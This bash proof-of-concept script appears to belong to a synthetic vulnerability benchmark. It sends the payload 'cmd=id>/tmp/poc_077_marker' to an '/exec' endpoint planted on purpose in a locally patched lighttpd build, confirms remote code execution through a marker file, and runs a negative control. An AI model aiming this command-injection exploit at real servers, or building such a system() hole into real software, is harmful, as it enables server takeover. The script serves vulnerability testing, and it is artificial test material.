#!/usr/bin/env bash
# PoC for 077_lighttpd_C2I2S1
# Axes: C2 (C2 gate flags) / I2 (input flow) / S1 (sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (lighttpd) lives in this directory. If absent, run:
#   cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lighttpd"
WWWROOT="/tmp/poc_077_www"
MARKER="/tmp/poc_077_marker"
PORT=18077
NEG_PORT=19077
CONF="/tmp/poc_077_lighttpd.conf"

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Write minimal lighttpd config
cat > "$CONF" <<CONFEOF
server.port = $PORT
server.document-root = "$WWWROOT"
server.http-parseopts = ("url-normalize" => "disable")
CONFEOF

# -- start server ---------------------------------------------------------------
echo "[*] starting lighttpd with gate flags: --exec-mode --exec-debug on port $PORT..."
"$BINARY" -f "$CONF" -D --exec-mode --exec-debug &
SERVER_PID=$!
sleep 0.4

# S1: no sanitization, direct execution
# I: input flows directly to system()
echo "[*] sending payload: cmd=id>/tmp/poc_077_marker"
python3 -c "
import socket, time, sys
s = socket.socket()
s.connect(('127.0.0.1', $PORT))
payload = 'cmd=id>/tmp/poc_077_marker'
req = ('GET /exec?' + payload + ' HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n').encode()
s.sendall(req)
time.sleep(0.3)
resp = s.recv(4096)
s.close()
"
sleep 0.3

# -- verify --------------------------------------------------------------------
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# -- negative control: endpoint absent without gate flags ----------------------
echo "[*] verifying gate: endpoint must return 404 without gate flags..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null; SERVER_PID=0

NEG_CONF="/tmp/poc_077_neg.conf"
cat > "$NEG_CONF" <<CONFEOF
server.port = $NEG_PORT
server.document-root = "$WWWROOT"
server.http-parseopts = ("url-normalize" => "disable")
CONFEOF

"$BINARY" -f "$NEG_CONF" -D &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(python3 -c "
import socket
s = socket.socket()
s.connect(('127.0.0.1', $NEG_PORT))
s.sendall(b'GET /exec?cmd=id HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n')
resp = s.recv(4096).decode('utf-8', errors='replace')
s.close()
code = resp.split()[1] if len(resp.split()) > 1 else 'UNKNOWN'
print(code)
" 2>/dev/null || echo "UNKNOWN")
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null
rm -f "$NEG_CONF"

if [[ "$HTTP_CODE" == "404" || "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got $HTTP_CODE without gate flags"
else
    echo "[!] gate check: unexpected response $HTTP_CODE (expected 404/403)"
fi
